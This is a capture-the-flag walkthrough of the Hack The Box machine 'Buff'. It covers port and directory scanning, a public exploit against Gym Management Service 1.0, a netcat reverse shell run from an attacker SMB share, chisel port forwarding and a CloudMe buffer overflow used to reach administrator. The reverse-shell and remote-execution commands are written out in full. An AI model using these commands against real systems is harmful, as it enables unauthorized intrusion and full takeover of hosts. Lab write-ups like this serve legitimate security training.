![image](https://user-images.githubusercontent.com/105310322/196471216-474e621b-00c3-4a90-8d50-55ead69fd885.png)


### Tools: Feroxbuster, exploit.db

### Vulnerabilities: Gym Management Service, Buffer Overflow: CloudMe.exe

Nmap shows 1 port open on port 8080 which is a webpage we can visit.

```
└─$ nmap -A -p- -T4 -Pn 10.129.2.18
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-17 15:56 CDT
Nmap scan report for Buff.htb (10.129.2.18)
Host is up (0.14s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 505.48 seconds
```
A quick feroxbuster shows that their is an upload page and a logout page. Which means there is somewhere to login too.

```console
└─$ feroxbuster -u http://Buff.htb:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
301      GET        9l       30w      337c http://buff.htb:8080/include => http://buff.htb:8080/include/
301      GET        9l       30w      333c http://buff.htb:8080/img => http://buff.htb:8080/img/
200      GET      133l      308w     4969c http://buff.htb:8080/
302      GET        0l        0w        0c http://buff.htb:8080/include/logout.php => ../index.php
403      GET       42l       97w        0c http://buff.htb:8080/.html
200      GET        4l       20w      137c http://buff.htb:8080/register.php
301      GET        9l       30w      336c http://buff.htb:8080/upload => http://buff.htb:8080/upload/
200      GET      118l      265w     4169c http://buff.htb:8080/contact.php
200      GET        2l       12w      107c http://buff.htb:8080/upload.php
200      GET        2l       18w      143c http://buff.htb:8080/home.php
200      GET      141l      433w     5337c http://buff.htb:8080/about.php
403      GET       42l       97w        0c http://buff.htb:8080/webalizer
301      GET        9l       30w      337c http://buff.htb:8080/profile => http://buff.htb:8080/profile/
200      GET      133l      308w     4969c http://buff.htb:8080/index.php
403      GET       45l      113w        0c http://buff.htb:8080/phpmyadmin
301      GET        9l       30w      344c http://buff.htb:8080/profile/upload => http://buff.htb:8080/profile/upload/
200      GET        0l        0w        0c http://buff.htb:8080/include/functions.php
200      GET      121l      278w     4282c http://buff.htb:8080/edit.php
200      GET        2l       14w      132c http://buff.htb:8080/profile/index.php
200      GET      113l      268w     4252c http://buff.htb:8080/feedback.php
200      GET      168l      486w     7791c http://buff.htb:8080/packages.php
```
![image](https://user-images.githubusercontent.com/105310322/196527333-07a9eab7-2381-490c-b6cb-42b190c322a2.png)


After checking out the website just a bit we can see that it is running Gym Management Service 1.0. A quick google search gives us an exploit we can run.

https://www.exploit-db.com/exploits/48506

![image](https://user-images.githubusercontent.com/105310322/196527449-f3c3b91b-3d9a-49b0-8dee-2c2e7568186b.png)



After running the exploit we quickly gain access to the shaun user and nab the first flag.

```console
C:\xampp\htdocs\gym\upload> whoami
�PNG
�
buff\shaun
```
```console
C:\xampp\htdocs\gym\upload> type c:\users\shaun\Desktop\user.txt
�PNG
�
306d****************************
********************************
```

Since this shell sucks I went back and created a reverse shell.

Set up your smbshare.

```console
└─$ sudo impacket-smbserver rogue . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Then I ran the exploit again and executed my reverse shell without copying any files.

Note: This is a pretty cool trick I learned and makes things a little faster and easier if you are running into issues with getting files on the victim.

```console
└─$ python2.7 48506.py http://buff.htb:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> \\10.10.16.16\rogue\nc64.exe -e cmd.exe 10.10.16.16 1234
```

By checking through Shaun's files we see an interesting binary.

```console
PS C:\Users\shaun\Downloads> ls
ls


    Directory: C:\Users\shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe  
```

Again I am going to run winpeas without transferring it to the victim.

On host

```console
└─$ sudo impacket-smbserver rogue . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

On victim

```console
PS C:\users\shaun\Downloads> \\10.10.16.16\rogue\winPEASx64.exe
```
Linpeas shows the running processes and also tells us that the CloudMe service is being ran on localhost port 8888

```console
����������͹ Current TCP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                               
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         952             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5816            svchost
  TCP        0.0.0.0               7680          0.0.0.0               0               Listening         1072            svchost
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         8596            C:\xampp\apache\bin\httpd.exe
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         516             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1044            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1580            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2252            spoolsv
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         668             services
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         688             lsass
  TCP        10.129.2.18           139           0.0.0.0               0               Listening         4               System
  TCP        10.129.2.18           8080          10.10.16.16           42504           Close Wait        8596            C:\xampp\apache\bin\httpd.exe
  TCP        10.129.2.18           8080          10.10.16.16           55280           Established       8596            C:\xampp\apache\bin\httpd.exe
  TCP        10.129.2.18           49847         10.10.16.16           445             Established       4               System
  TCP        10.129.2.18           49848         10.10.16.16           1235            Established       6832            \\10.10.16.16\rogue\nc64.exe
  TCP        127.0.0.1             3306          0.0.0.0               0               Listening         8628            C:\xampp\mysql\bin\mysqld.exe
  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         4280            CloudMe
```
This PoC should do the job pretty quickly but we will need to modify the script a little to

https://www.exploit-db.com/exploits/48389

```console
└─$ sudo impacket-smbserver rogue . -smb2support
[sudo] password for npayne: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
```console
c:\Users\Public>copy \\10.10.16.16\rogue\chiselwin.exe chiselwin.exe
copy \\10.10.16.16\rogue\chiselwin.exe chiselwin.exe
        1 file(s) copied.
```

```console
└─$ chisel server --reverse --port 1234
2022/10/18 14:18:24 server: Reverse tunnelling enabled
2022/10/18 14:18:24 server: Fingerprint RZQ9LOlLjBYeVcnA6fq7Fi90YADFsXsI+giE5JxJZp8=
2022/10/18 14:18:24 server: Listening on http://0.0.0.0:1234
2022/10/18 14:18:49 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/10/18 14:18:49 server: session#1: tun: proxy#R:8888=>8888: Listening
```
```console
c:\Users\Public>chiselwin.exe client 10.10.16.16:1234 R:8888:127.0.0.1:8888
chiselwin.exe client 10.10.16.16:1234 R:8888:127.0.0.1:8888
2022/10/18 20:18:48 client: Connecting to ws://10.10.16.16:1234
2022/10/18 20:18:48 client: Connected (Latency 31.6057ms)
```

```console
└─$ nc -lvnp 5555
listening on [any] 443 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.7.44] 49680
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
buff\administrator
```
```console
C:\users\administrator\Desktop> type root.txt
type root.txt
c2a8****************************
```
